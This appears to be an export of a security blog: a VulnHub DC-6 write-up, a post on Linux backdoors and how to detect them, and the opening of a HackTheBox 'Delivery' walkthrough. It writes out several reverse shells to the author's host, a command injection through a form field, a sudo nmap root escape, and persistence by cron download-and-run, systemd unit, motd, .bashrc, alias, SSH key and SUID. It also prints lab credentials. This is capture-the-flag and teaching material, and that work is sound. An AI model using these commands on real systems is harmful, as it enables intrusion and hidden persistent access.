user\u0026rsquo;s credentials is discovered while enumerating the home directory. For the root part, there is a sudo privileges on a writable backup script and nmap which allows me to escalate to other users then straight to root.\nSkills Learned  WordPress enumeration and plugin exploitation Exploiting sudo privileges on nmap  Tools  Nmap Arpscan WPScan BurpSuite  Reconnaissance Host Discovery - arpscan Because 192.168.2.1 and 192.168.2.2 are virtual gateway addresses, the target machine\u0026rsquo;s IP address is most likely 192.168.2.104.\n→ root@iamf «dc-6» «192.168.43.234» $ arp-scan --interface eth0 \u0026#39;192.168.2.0/24\u0026#39; | tee scans/00-arp-scan-dc6 Interface: eth0, type: EN10MB, MAC: 08:00:27:0b:94:f0, IPv4: 192.168.2.103 Starting arp-scan 1.9.7 with 256 hosts (https://github.com/royhills/arp-scan) 192.168.2.1 08:00:27:e8:e9:78 PCS Systemtechnik GmbH 192.168.2.2 0a:00:27:00:00:07 (Unknown: locally administered) 192.168.2.104 08:00:27:ac:db:5f PCS Systemtechnik GmbH Nmap With initial scan, nmap shows two ports open: SSH on port 22 and Apache Web Server on port 80.\n→ root@iamf «dc-6» «192.168.43.234» $ nmap -n -sC -sV -oA scans/10-initial-dc6 \u0026#39;192.168.2.104\u0026#39; -v PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0) | ssh-hostkey: | 2048 3e:52:ce:ce:01:b6:94:eb:7b:03:7d:be:08:7f:5f:fd (RSA) | 256 3c:83:65:71:dd:73:d7:23:f8:83:0d:e3:46:bc:b5:6f (ECDSA) |_ 256 41:89:9e:85:ae:30:5b:e0:8f:a4:68:71:06:b4:15:ee (ED25519) 80/tcp open http Apache httpd 2.4.25 ((Debian)) | http-methods: |_ Supported Methods: GET HEAD POST OPTIONS |_http-server-header: Apache/2.4.25 (Debian) |_http-title: Did not follow redirect to http://wordy/ |_https-redirect: ERROR: Script execution failed (use -d to debug) MAC Address: 08:00:27:AC:DB:5F (Oracle VirtualBox virtual NIC) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Read data files from: /usr/bin/../share/nmap Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Sat Apr 10 01:42:04 2021 -- 1 IP address (1 host up) scanned in 15.00 second From the results above, there\u0026rsquo;s a redirection to http://wordy/ on port 80. To properly resolve the web, I\u0026rsquo;ll add wordy to my /etc/hosts file.\n192.168.1.104 wordy Enumeration TCP 80 - Website This page clearly states that it\u0026rsquo;s a WordPress site.\nNothing interesting to explore, but the text secure plugins seems to be a hint from the machine\u0026rsquo;s author.\nI ran a gobuster scan but found nothing useful.\nNmap NSE nmap script scan found some usernames.\n→ root@iamf «dc-6» «192.168.43.234» $ nmap -p 80 --script \u0026#34;http-wordpress*\u0026#34; wordy Starting Nmap 7.80 ( https://nmap.org ) at 2021-04-11 23:13 EDT Nmap scan report for wordy (192.168.2.104) Host is up (0.00069s latency). PORT STATE SERVICE 80/tcp open http ... | /: WordPress version: 5.1.1 ... | http-wordpress-users: | Username found: admin | Username found: graham | Username found: mark | Username found: sarah | Username found: jens |_Search stopped at ID #25. Increase the upper limit if necessary with \u0026#39;http-wordpress-users.limit\u0026#39; MAC Address: 08:00:27:AC:DB:5F (Oracle VirtualBox virtual NIC) Nmap done: 1 IP address (1 host up) scanned in 22.48 seconds WPScan wpscan identifies two vulnerable WP plugins: an RCE and a user role privilege escalation.\n→ root@iamf «dc-6» «192.168.43.234» $ wpscan --url http://wordy/ --enumerate vp --api-token token123 --plugins-detection aggressive ... [+] plainview-activity-monitor | Location: http://wordy/wp-content/plugins/plainview-activity-monitor/ | Last Updated: 2018-08-26T15:08:00.000Z | Readme: http://wordy/wp-content/plugins/plainview-activity-monitor/readme.txt | [!] The version is out of date, the latest version is 20180826 | [!] Directory listing is enabled | | Found By: Known Locations (Aggressive Detection) | - http://wordy/wp-content/plugins/plainview-activity-monitor/, status: 200 | | [!] 1 vulnerability identified: | | [!] Title: Plainview Activity Monitor \u0026lt;= 20161228 - Remote Command Execution (RCE) | Fixed in: 20180826 | References: | - https://wpscan.com/vulnerability/ab749b6c-c405-40e0-8417-0fe1bdb8537c | - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-15877 | - https://plugins.trac.wordpress.org/changeset/1930493/plainview-activity-monitor | - https://www.rapid7.com/db/modules/exploit/unix/webapp/wp_plainview_activity_monitor_rce/ | | Version: 20161228 (50% confidence) | Found By: Readme - ChangeLog Section (Aggressive Detection) | - http://wordy/wp-content/plugins/plainview-activity-monitor/readme.txt [+] user-role-editor | Location: http://wordy/wp-content/plugins/user-role-editor/ | Last Updated: 2021-04-05T02:38:00.000Z | Readme: http://wordy/wp-content/plugins/user-role-editor/readme.txt | [!] The version is out of date, the latest version is 4.59 | | Found By: Known Locations (Aggressive Detection) | - http://wordy/wp-content/plugins/user-role-editor/, status: 200 | | [!] 1 vulnerability identified: | | [!] Title: User Role Editor \u0026lt;= 4.24 - Privilege Escalation | Fixed in: 4.25 | References: | - https://wpscan.com/vulnerability/85e595f5-9f04-4799-9a09-c6675071b12c | - https://www.wordfence.com/blog/2016/04/user-role-editor-vulnerability/ | | Version: 4.24 (80% confidence) | Found By: Readme - Stable Tag (Aggressive Detection) | - http://wordy/wp-content/plugins/user-role-editor/readme.txt ... I\u0026rsquo;m interested with the RCE one, but before that I\u0026rsquo;ll have to find creds.\nBrute-forcing passwords At that time, I was stuck for a couple of hours. Asking for a nudge and the answer was to brute force, I didn\u0026rsquo;t know that the box\u0026rsquo;s author actually gave us a hint to create a custom wordlist from rokyou.txt.\nI\u0026rsquo;ll create new wordlist from rockyou.txt and then use it to perform a brute force using wpscan.\n→ root@iamf «dc-6» «192.168.43.234» $ cat /usr/share/wordlists/rockyou.txt | grep k01 \u0026gt; passwords.txt → root@iamf «dc-6» «192.168.43.234» $ wpscan --url http://wordy/ --usernames users --passwords passwords.txt It returns one valid credentials: mark:helpdesk10.\nFoothold Shell as www-data WP Dashboard With the credentials I obtained, I can login into the admin panel.\nPlainview Activity Monitor - RCE (CVE-2018-15877) From the previous wpscan, I searched the exploit PoC for Plainview Activity Monitor RCE and found this from exploit-db:\n\u0026lt;html\u0026gt; \u0026lt;!-- Wordpress Plainview Activity Monitor RCE [+] Version: 20161228 and possibly prior [+] Description: Combine OS Commanding and CSRF to get reverse shell [+] Author: LydA(c)ric LEFEBVRE [+] CVE-ID: CVE-2018-15877 [+] Usage: Replace 127.0.0.1 \u0026amp; 9999 with you ip and port to get reverse shell [+] Note: Many reflected XSS exists on this plugin and can be combine with this exploit as well --\u0026gt; \u0026lt;body\u0026gt; \u0026lt;script\u0026gt;history.pushState(\u0026#39;\u0026#39;, \u0026#39;\u0026#39;, \u0026#39;/\u0026#39;)\u0026lt;/script\u0026gt; \u0026lt;form action=\u0026#34;http://localhost:8000/wp-admin/admin.php?page=plainview_activity_monitor\u0026amp;tab=activity_tools\u0026#34; method=\u0026#34;POST\u0026#34; enctype=\u0026#34;multipart/form-data\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;hidden\u0026#34; name=\u0026#34;ip\u0026#34; value=\u0026#34;google.fr| nc -nlvp 127.0.0.1 9999 -e /bin/bash\u0026#34; /\u0026gt; \u0026lt;input type=\u0026#34;hidden\u0026#34; name=\u0026#34;lookup\u0026#34; value=\u0026#34;Lookup\u0026#34; /\u0026gt; \u0026lt;input type=\u0026#34;submit\u0026#34; value=\u0026#34;Submit request\u0026#34; /\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; The vulnerability comes from this IP tools feature.\nI\u0026rsquo;ll hit the lookup button and intercept the request on Burp.\nRCE can be achieved by adding a set of malicious OS commands after the command pipe |, semi colon ; (stacked command), or logical OR || at the ip section. In this case, I send a reverse shell.\nHere is with command pipe.\nAnd this one by stacking commands with semicolon.\nI can not find the plugin\u0026rsquo;s source code, my best guess it can be something like this.\n... $ip = $_POST[\u0026#39;ip\u0026#39;] $do_something = exec(\u0026#34;dig $ip\u0026#34;) ... Privilege Escalation Shell as graham Internal enumeration The home directory is readable by www-data.\nwww-data@dc-6:/var/www/html/wp-admin$ find /home 2\u0026gt;/dev/null find /home 2\u0026gt;/dev/null ... /home/jens/backups.sh .... /home/mark/stuff/things-to-do.txt .... I immediately checked the contents of backups.sh and things-to-do.txt.\nThe backups.sh script is writable by group devs, and I\u0026rsquo;ll note that.\nwww-data@dc-6:/var/www/html/wp-admin$ ls -l /home/jens/backups.sh ls -l /home/jens/backups.sh -rwxrwxr-x 1 jens devs 50 Apr 26 2019 /home/jens/backups.sh www-data@dc-6:/var/www/html/wp-admin$ cat /home/jens/backups.sh cat /home/jens/backups.sh #!/bin/bash tar -czf backups.tar.gz /var/www/html And this things-to-do.txt contains graham\u0026rsquo;s credentials.\nwww-data@dc-6:/var/www/html/wp-admin$ cat /home/mark/stuff/things-to-do.txt cat /home/mark/stuff/things-to-do.txt Things to do: - Restore full functionality for the hyperdrive (need to speak to Jens) - Buy present for Sarah\u0026#39;s farewell party - Add new user: graham - GSo7isUM1D4 - done - Apply for the OSCP course - Buy new laptop for Sarah\u0026#39;s replacement SSH - graham I tried the graham\u0026rsquo;s creds, graham:GSo7isUM1D4, on SSH, and it worked.\n→ root@iamf «dc-6» «192.168.43.234» $ ssh graham@192.168.2.104 graham@192.168.2.104\u0026#39;s password: Linux dc-6 4.9.0-8-amd64 #1 SMP Debian 4.9.144-3.1 (2019-02-19) x86_64 The programs included with the Debian GNU/Linux system are free software; the exact distribution terms for each program are described in the individual files in /usr/share/doc/*/copyright. Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent permitted by applicable law. graham@dc-6:~$ id uid=1001(graham) gid=1001(graham) groups=1001(graham),1005(devs) Shell as jens Sudo privileges - backups.sh User graham has sudo privileges on the backups.sh script, and this allows me to run the script as user jens.\ngraham@dc-6:~$ sudo -l Matching Defaults entries for graham on dc-6: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin User graham may run the following commands on dc-6: (jens) NOPASSWD: /home/jens/backups.sh graham@dc-6:~$ cat /home/jens/backups.sh #!/bin/bash tar -czf backups.tar.gz /var/www/html graham@dc-6:~$ ls -l /home/jens/backups.sh -rwxrwxr-x 1 jens devs 50 Apr 26 2019 /home/jens/backups.sh Because the script is also writable by graham (devs group), I can exploit this to escalate myself to jens by adding a reverse shell line to the script and then run it with sudo.\ngraham@dc-6:~$ echo \u0026#39;bash -i \u0026gt;\u0026amp; /dev/tcp/192.168.2.108/9000 0\u0026gt;\u0026amp;1\u0026#39; \u0026gt;\u0026gt; /home/jens/backups.sh Shell as root Sudo privileges - nmap I found out that user jens is allowed to execute nmap as root user.\njens@dc-6:/home/graham$ sudo -l sudo -l Matching Defaults entries for jens on dc-6: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin User jens may run the following commands on dc-6: (root) NOPASSWD: /usr/bin/nmap I\u0026rsquo;ll also exploit this using reference from GTFObins.\njens@dc-6:/home/graham$ TF=$(mktemp) jens@dc-6:/home/graham$ echo \u0026#39;os.execute(\u0026#34;/bin/sh\u0026#34;)\u0026#39; \u0026gt; $TF jens@dc-6:/home/graham$ sudo nmap --script=$TF And here is the flag.\nroot@dc-6:~# cat theflag.txt Yb dP 888888 88 88 8888b. dP\u0026#34;Yb 88b 88 888888 d8b Yb db dP 88__ 88 88 8I Yb dP Yb 88Yb88 88__ Y8P YbdPYbdP 88\u0026#34;\u0026#34; 88 .o 88 .o 8I dY Yb dP 88 Y88 88\u0026#34;\u0026#34; `\u0026#34;\u0026#39; YP YP 888888 88ood8 88ood8 8888Y\u0026#34; YbodP 88 Y8 888888 (8) Congratulations!!! Hope you enjoyed DC-6. Just wanted to send a big thanks out there to all those who have provided feedback, and who have taken time to complete these little challenges. If you enjoyed this CTF, send me a tweet via @DCAU7.  References  https://www.vulnhub.com/entry/dc-6,315/ https://gtfobins.github.io/gtfobins/nmap/  ","permalink":"https://fahmifj.github.io/writeups/vulnhub/vh-dc6/","summary":"DC-6 starts off by enumerating usernames from a WordPress website. I\u0026rsquo;m able to gain a set of credentials to log into the admin panel with a brute-force attack. There is a WP Plugin which can be leveraged to gain a foothold on the system. A to-do note containing the user\u0026rsquo;s credentials is discovered while enumerating the home directory. For the root part, there is a sudo privileges on a writable backup script and nmap which allows me to escalate to other users then straight to root.","tags":["OSCP-like","Linux","WordPress","CVE-2018-15877","sudo","GTFOBins","NSE","wpscan"],"title":"VulnHub - DC-6"},{"content":"[Updated 25-06-2021]\nIn Attack-Defense CTF, leaving backdoors is an important part of maintaining access on the target system. As a result, learning some of the backdoor techniques is essential, not only for attackers but also for defenders.\nBackdoors, what is it? Well, I\u0026rsquo;m not going to go into as much detail as Wikipedia, but here\u0026rsquo;s:\nA backdoor is a hidden piece of code, script, or a program that is placed on a system for persistence purposes, with that you don’t have to exploit the same system twice. It simply gives you quicker and instant access to the system.\nNow that we know what a backdoor is, let\u0026rsquo;s find out where the attackers typically hide them in a Linux system. For demonstration, I’ll be using the Pinky’s Palace machine from VulnHub, and let’s pretend it has been compromised.\n1. SSH keys SSH authorized_keys file contains a list of authorized users/public keys that are allowed to login into a specific account. In this file, the attackers can also place their public keys to authorize themselves and get instant access to the system via SSH.\nFor example, below are the exploitation steps to gain root access on the target system (Pinky\u0026rsquo;s Palace).\nOf course, as an attacker, I don’t want to repeat all those exploitation steps all over again.\nSo instead, on my attacking machine, I’ll generate a new pair of SSH keys specialized for backdoor.\nAnd then, in this example, I can insert the newly generated public key (backdoor_ssh.pub) into the root authorized_keys file of the compromised system.\nmkdir -p /root/.ssh/ \u0026amp;\u0026amp; echo \u0026#39;ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILaxTiK3WJJ422K1yf/9yXFWBeWV6mpZxMEualO2uIul root@kali\u0026#39; \u0026gt; /root/.ssh/authorized_keys Now by specifying backdoor_ssh as the identity file (private key), I’m able to gain access on the compromised system via SSH.\n2. SSH motd This is one of the cool tricks I\u0026rsquo;ve learned from HackTheBox machine called Traceback.\nMotd (Message of the day) is the banner that appears when you log into the machine using SSH. For Ubuntu/Debian motd can be found at /etc/update-motd.d. By default, other users don\u0026rsquo;t have write permission on that directory.\nIn the image above, there is only one motd script called 10-uname.\nAs an attacker, I could place a new script there as a backdoor. For example, I\u0026rsquo;ll put a netcat reverse shell script and name it as 20-backdoor inside /etc/update-motd.d/.\nroot@pinkys-palace:/etc/update-motd.d# echo -e \u0026#39;#!/bin/sh\\nnc 192.168.2.103 9001 -e /bin/bash \u0026amp;\u0026#39; \u0026gt; 20-backdoor \u0026amp;\u0026amp; chmod +x 20-backdoor Then I\u0026rsquo;ll login into the machine using a low privilege account named pinky.\nAs you can see, that SSH login triggers my backdoor.\nBut wait, I logged in using pinky. How did I end up with a root shell?\nHere is the answer:\n \u0026hellip;\n​ Executable scripts in /etc/update-motd.d/* are executed by pam_motd(8) as the root user at ​ each login, and this information is concatenated in /var/run/motd. The order of script ​ execution is determined by the run-parts(8) \u0026ndash;lsbsysinit option (basically alphabetical ​ order, with a few caveats).\n\u0026hellip;\n 3. User\u0026rsquo;s .bashrc - Interactive session .bashrc is one of the startup scripts used by Bourne shell aka bash. If there is a user who uses bash as their login shell, then this .bashrc will be executed for each interactive session they launch.\nHere is some actions that triggers an interactive session:\nIn the image above, I inserted a non malicious line script echo \u0026quot;I'm triggered\u0026quot; to my .bashrc. But now, as an attacker, I can put a reverse shell there, and I\u0026rsquo;ll just wait for someone to log in to trigger it.\npinky@pinkys-palace:~$ echo \u0026#39;nc 192.168.2.103 9001 -e /bin/bash \u0026gt;/dev/null \u0026amp;\u0026#39; \u0026gt; .bashrc In the image above, I switched from root to user pinky and put a reverse shell on pinky\u0026rsquo;s .bashrc file. I exited pinky\u0026rsquo;s shell and immediately switch again to user pinky to trigger an interactive session.\n4. User\u0026rsquo;s .bashrc - Aliases As an attacker, I can also put the backdoor in the users' aliases!\nHere is an example of a backdoored cd command.\nroot@pinkys-palace:~# alias cd=\u0026#39;$(nc 192.168.2.103 9001 -e /bin/bash\u0026amp;); cd\u0026#39; Some other tricky backdoors using alias:\n https://github.com/nisay759/sudo-backdoor https://gist.github.com/ahhh/1d4bf832c5a88cc75adb  5. Cron jobs Cron is a feature from Linux/UNIX-like OS that can be used to periodically perform a specific job or task just like Task Scheduler in Windows.\nHere is an example of a backdoor using Cron job.\nroot@pinkys-palace:~# echo \u0026#39;* * * * * root cd /tmp; wget 192.168.2.103/backdoor \u0026amp;\u0026amp; chmod +x backdoor \u0026amp;\u0026amp; ./backdoor\u0026#39; \u0026gt; /etc/cron.d/backdoor What the task above does is it will download a malicious binary called \u0026lsquo;backdoor\u0026rsquo; which is hosted on my attacking machine, and the backdoor is then executed once every minute.\n6. Backdoor as a Service (BaaS) An attacker can also create a backdoor as a service (BaaS). Here is an example of BaaS in a single file (backdoor.service):\n[Service] Type=simple User=root ExecStart=/bin/bash -c \u0026#34;bash -i \u0026gt;\u0026amp; /dev/tcp/192.168.2.103/9001 0\u0026gt;\u0026amp;1\u0026#34; [Install] WantedBy=multi-user.target\u0026#39; When the service is started, it launches a reverse shell to the attacker.\nroot@pinkys-palace:/etc/systemd/system# systemctl start backdoor.service It can be enabled on boot by issuing the following command:\nroot@pinkys-palace:/etc/systemd/system# systemctl enable backdoor.service 7. SUID The last one on this post is SUID.\nAs an example, I can make a copy of bash called .backdoor (notice the dot) to a low privilege user but has been compromised, and then set SUID permission on it.\nWhy do I add dot?\nWell, this is based on my observation on some people out there. They tend to just use ls -l rather than ls -la, and this becomes an advantage for attackers to put a backdoor with a dot.\nIt’s not just about SUID though, it applies to other backdoors as well (*cough* and .git folder *cough*)\nBlue Team side Before reading further, I’ll state that if your server (irl) gets hacked, it’s better to restore the server’s backup or completely rebuild it from scratch, because in the real world, those backdoors can be obfuscated and combined with other techniques (not to mention there might be a rootkit too), making it difficult to detect/find.\nAlso what I share here might not be that effective, but here is how I usually deal with those backdoors in attack-defense CTF.\nSSH keys and .bashrc. Make sure to regularly check the all the users authorized_keys file.\nIn the image below, there is a public key with a foreign hostname kali instead of pinkys-palace, then we should suspect it.\nWell, actually, the attackers might have tricked it to look like it was a legitimate one.\nMy workaround here is why don’t we create a ‘skeleton’ file of all the authorized_keys files and set a Cronjob which automatically reverts those files back to its original state, and I might perform it remotely via scp. This can be applied as well to handle backdoor in .bashrc .\n You can find the skeleton file of .bashrc at /etc/skel.\n SSH motd It\u0026rsquo;s not always placed on /etc/update-motd.d, but make sure the motd directory is only writable by root, note the default list of motd files and apply the same thing as above (skeleton file) because the attackers might have inserted a backdoor in the original files.\nWe could also do some \u0026lsquo;forensics\u0026rsquo; using timestamp:\nroot@MSI:/etc/update-motd.d# ls --full-time For example, those files with the timestamp 000000000 (nano) in the image below have most likely not been modified and are still in their original state.\nAfter inserting a non-malicious line, the timestamp changed. From here, it\u0026rsquo;s safe to assume that someone/something has modified it.\nCronjobs and Services We can monitoring the process using netstat and ps command. Anything that looks like a reverse shell or a bind shell is definitely suspicious.\nTo find an unwanted open port we can use this command:\n$ netstat -antp | grep LISTEN To find a suspicious connection we can use this command:\n$ netstat -antp | grep ESTABLISHED Sometimes the state of a reverse shell backdoor is neither ESTABLISHED nor LISTEN but SYN_SENT. This occurs when the backdoor fail to reach out the attacker.\nTo find that we can use the following command:\n$ netstat -antp | grep SYN_SENT We could also check each user\u0026rsquo;s crontab using the following command\n$ for user in $(cat /etc/passwd | cut -f1 -d: ); do echo $user; crontab -u $user -l; done # Only users who have login shell $ for user in $(cat /etc/passwd | grep sh$ | cut -f1 -d: ); do echo $user; crontab -u $user -l; done There is also the ps -f command which is pretty good at visualizing the process tree. For example, here we know that the culprit that keeps opening the HTTPS port (443) is probably on .bashrc file because it gets triggered every time we launch a bash shell (interactive session).\nIf you prefer the detailed view, consider to use ps auxfww to show process tree with username, TTY, and a wide output.\nFinding SUID To find some suspicious SUID we can use the find commands. It can also detect the SUID that started with dot!\nroot@pinkys-palace:/etc/update-motd.d# find / -type f -perm 4755 2\u0026gt;/dev/null So that\u0026rsquo;s all for today.\n References  https://www.techslang.com/definition/what-is-a-reverse-shell/ https://medium.com/risan/upgrade-your-ssh-key-to-ed25519-c6e8d60d3c54 https://blog.g0tmi1k.com/2011/08/kioptrix-level-3/ https://airman604.medium.com/9-ways-to-backdoor-a-linux-box-f5f83bae5a3c https://gist.github.com/ahhh/1d4bf832c5a88cc75adb https://ippsec.rocks/?#  ","permalink":"https://fahmifj.github.io/blog/linux-backdoors-and-where-to-find-them/","summary":"[Updated 25-06-2021]\nIn Attack-Defense CTF, leaving backdoors is an important part of maintaining access on the target system. As a result, learning some of the backdoor techniques is essential, not only for attackers but also for defenders.\nBackdoors, what is it? Well, I\u0026rsquo;m not going to go into as much detail as Wikipedia, but here\u0026rsquo;s:\nA backdoor is a hidden piece of code, script, or a program that is placed on a system for persistence purposes, with that you don’t have to exploit the same system twice.","tags":["Linux","Server","Backdoor","Security","Forensics"],"title":"Linux Backdoors and Where to Find Them"},{"content":"Delivery from HackTheBox is all about exploiting a logic flaw called TicketTrick which was discovered by Inti De Ceukelaire.\nOn this machine, there is a helpdesk ticketing system that gives an unauthenticated user a temporary email with a legitimate company domain. Using that email, I\u0026rsquo;m able to register at Mattermost and gain access to the company private communication channel. The conversation in the channel leaks a set of SSH credentials and a password in which its variant is being used in the system. There is a set of database credentials in the Mattermost configuration file, which can be used to dump the password hash of the root account. After generating a variant of the exposed password with hashcat, I\u0026rsquo;m able to crack the password and obtain root access.\nSkills Learned  TicketTrick Generating wordlist using hashcat  Tools  Kali Linux (Attacking Machine) - https://www.kali.org/ Nmap - Preinstalled in Kali Linux hashcat  Reconnaissance Nmap nmap full TCP scan discovers three open ports: An SSH on port 22, an HTTP server on port 80, and an unknown service on port 8065\n→ root@kali «delivery» «10.10.14.70» $ nmap -p- --min-rate 1000 -sV --reason -oA nmap/10-tcp-allport-delivery 10.10.10.222 Starting Nmap 7.80 ( https://nmap.org ) at 2021-05-21 14:58 EDT .... PORT STATE SERVICE REASON VERSION 22/tcp open ssh syn-ack ttl 63 OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0) 80/tcp open http syn-ack ttl 63 nginx 1.14.2 8065/tcp open unknown syn-ack ttl 63 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service : SF-Port8065-TCP:V=7.80%I=7%D=5/21%Time=60A80336%P=x86_64-pc-linux-gnu%r(Ge SF:nericLines,67,\u0026#34;HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nContent-Type:\\x20t SF:ext/plain;\\x20charset=utf-8\\r\\nConnection:\\x20close\\r\\n\\r\\n400\\x20Bad\\x SF:20Request\u0026#34;)%r(GetRequest,DF3,\u0026#34;HTTP/1\\.0\\x20200\\x20OK\\r\\nAccept-Ranges:\\ .... → root@kali «delivery» «10.10.14.70» $ nmap -p22,80,8065 --min-rate 1000 -sC --reason -oA nmap/10-tcp-allport-delivery 10.10.10.222 Starting Nmap 7.80 ( https://nmap.org ) at 2021-05-21 15:06 EDT Nmap scan report for 10.10.10.222 Host is up, received echo-reply ttl 63 (0.45s latency). PORT STATE SERVICE REASON 22/tcp open ssh syn-ack ttl 63 | ssh-hostkey: | 2048 9c:40:fa:85:9b:01:ac:ac:0e:bc:0c:19:51:8a:ee:27 (RSA) | 256 5a:0c:c0:3b:9b:76:55:2e:6e:c4:f4:b9:5d:76:17:09 (ECDSA) |_ 256 b7:9d:f7:48:9d:a2:f2:76:30:fd:42:d3:35:3a:80:8c (ED25519) 80/tcp open http syn-ack ttl 63 |_http-title: Welcome 8065/tcp open unknown syn-ack ttl 63 I can clearly see the fingerprint of port 8065 indicate that it\u0026rsquo;s a HTTP server. I can confirm it with curl.\n→ root@kali «delivery» «10.10.14.70» $ curl -sI 10.10.10.222:8065 HTTP/1.1 405 Method Not Allowed Date: Fri, 21 May 2021 19:09:14 GMT Enumeration TCP 80 - Website This page is a static website.\nThe text “HELPDESK” points to http://helpdesk.delivery.htb/ . Clicking on the \u0026ldquo;CONTACT US\u0026rdquo; flips the homepage to this views:\nThe text “MatterMost server” points to http://delivery.htb:8065.\nI can use curl and grep command to grab all the links/URL from this page.\n→ root@kali «delivery» «10.10.14.70» $ curl -s 10.10.10.222 | grep -Eo \u0026#39;href=\u0026#34;[^\\\u0026#34;]+\u0026#34;\u0026#39; | grep -v \u0026#39;#\u0026#39; href=\u0026#34;assets/css/main.css\u0026#34; href=\u0026#34;assets/css/ie9.css\u0026#34; href=\u0026#34;assets/css/noscript.css\u0026#34; href=\u0026#34;http://helpdesk.delivery.htb\u0026#34; href=\u0026#34;http://helpdesk.delivery.htb\u0026#34; href=\u0026#34;http://delivery.htb:8065\u0026#34; href=\u0026#34;https://html5up.net\u0026#34; I’ll add the newly discovered hostnames to my /etc/hosts:\n→ root@kali «delivery» «10.10.14.70» $ echo \u0026#39;10.10.10.222 delivery.htb helpdesk.delivery.htb\u0026#39; \u0026gt; /etc/hosts Before moving on, we can poke the hostnames and compare their page size to check if this site has different content when we visit it with a hostname.\n→ root@kali «delivery» «10.10.14.70» $ curl -s http://10.10.10.222/ | wc -c 10850 → root@kali «delivery» «10.10.14.70» $ curl -s http://delivery.htb/ | wc -c 10850 → root@kali «delivery» «10.10.14.70» $ curl -s http://helpdesk.delivery.htb/ | wc -c 4933 There is only one page that has different in size.\nI did a gobuster scan but find nothing useful in the results, so I\u0026rsquo;ll move to the next prt.\nTCP 80 - helpdesk.delivery.htb There is a helpdesk ticketing system here. At the bottom of the page it shows it is powered by osTicket.\nThe \u0026ldquo;Open a New Ticket\u0026rdquo; menu.\nThe \u0026ldquo;Check Ticket Status\u0026rdquo; menu.\nOpen a New Ticket According to the message at http://delivery.htb/#contact-us, guest user seems to be allowed to create a ticket here.\nFor unregistered users, please use our HelpDesk to get in touch with our team. Once you have an @delivery.htb email address, you\u0026#39;ll be able to have access to our MatterMost server. I\u0026rsquo;ll create one.\nOnce the ticket request is submitted, it notifies that the ticket has been created.\nBesides the ticket id, it also gives us a temporary email with domain of delivery.htb, and I\u0026rsquo;ll note that:\n Ticket : 4709941 Email: 4709941@delivery.htb.  The created ticket can be accessed/viewed on “Check Ticket Status” menu.\nFinding vulnerabilities - Exploit-DB The app source code is available on Github: https://github.com/osTicket/osTicket. But, it seems I\u0026rsquo;ll need an admin access to find the version.\nYou guess it, we can limit the search based on the box release (9 January 2021):\nBut those exploits mostly XSS that requires a user interaction and there is no indication for that in this box, so let’s move to the next one.\nTCP 8065 — Mattermost There is an instance of Mattermost here and it requires an account.\nSign up is allowed, but the page clearly shows that valid email is required.\nAnd here is why a valid email is required, there is a verification process.\nFoothold Shell as maildeliverer Access to Mattermost using TicketTrick The idea of TicketTrick here is to use the temporary email address given by the support ticket system to register on Mattermost.\nFor me, the previous email is: 4709941@delivery.htb. I’ll use that to register on Mattermost.\nThe verification is sent to 4709941@delivery.htb.\nBack on helpdesk, I can see the verification link to activate the my previously created Mattermost account.\nVisiting http://delivery.htb:8065/do_verify_email?token=eoy11mus8h6m4hctpmwt9qw31cdsfcxzbg7noyc5gzpc6htp9e8mqe55wwewaju9\u0026amp;email=4709941%40delivery.htb redirects back to MatterMost which confirms the email has been verified.\nUpon logging in, I\u0026rsquo;m able to join the Internal channel (like server on Discord). There is one channel called internal.\nThe chats from root contain a set of credentials and a few hints which indicates that they use a variant password of “PleaseSubscribe!”.\nSSH - maildeliverer The credentials of maildeliverer works on SSH.\n→ root@kali «delivery» «10.10.14.70» $ ssh maildeliverer@delivery.htb ... maildeliverer@delivery.htb\u0026#39;s password: Linux Delivery 4.19.0-13-amd64 #1 SMP Debian 4.19.160-2 (2020-11-28) x86_64 ... Last login: Fri May 21 14:11:23 2021 from 10.10.16.16 maildeliverer@Delivery:~$ id uid=1000(maildeliverer) gid=1000(maildeliverer) groups=1000(maildeliverer) The user flag is done here.\nmaildeliverer@Delivery:~$ ls -l total 4 -r-------- 1 maildeliverer maildeliverer 33 May 21 11:21 user.txt Privilege Escalation Shell as root Internal Enumeration Enumerating on /opt finds the Mattermost installation folder. The Mattermost config file contains the database credentials.\nmaildeliverer@Delivery:/opt/mattermost/config$ cat config.json | grep SqlSetting -A10 \u0026#34;SqlSettings\u0026#34;: { \u0026#34;DriverName\u0026#34;: \u0026#34;mysql\u0026#34;, \u0026#34;DataSource\u0026#34;: \u0026#34;mmuser:Crack_The_MM_Admin_PW@tcp(127.0.0.1:3306)/mattermost?charset=utf8mb4,utf8\\u0026readTimeout=30s\\u0026writeTimeout=30s\u0026#34;, \u0026#34;DataSourceReplicas\u0026#34;: [], \u0026#34;DataSourceSearchReplicas\u0026#34;: [], \u0026#34;MaxIdleConns\u0026#34;: 20, \u0026#34;ConnMaxLifetimeMilliseconds\u0026#34;: 3600000, \u0026#34;MaxOpenConns\u0026#34;: 300, \u0026#34;Trace\u0026#34;: false, \u0026#34;AtRestEncryptKey\u0026#34;: \u0026#34;n5uax3d4f919obtsp1pw1k5xetq1enez\u0026#34;, \u0026#34;QueryTimeout\u0026#34;: 30, The credentials is mmuser:Crack_The_MM_Admin_PW.\nMySQL - Dump Passwords With database credentials, I can connect to the MySQL 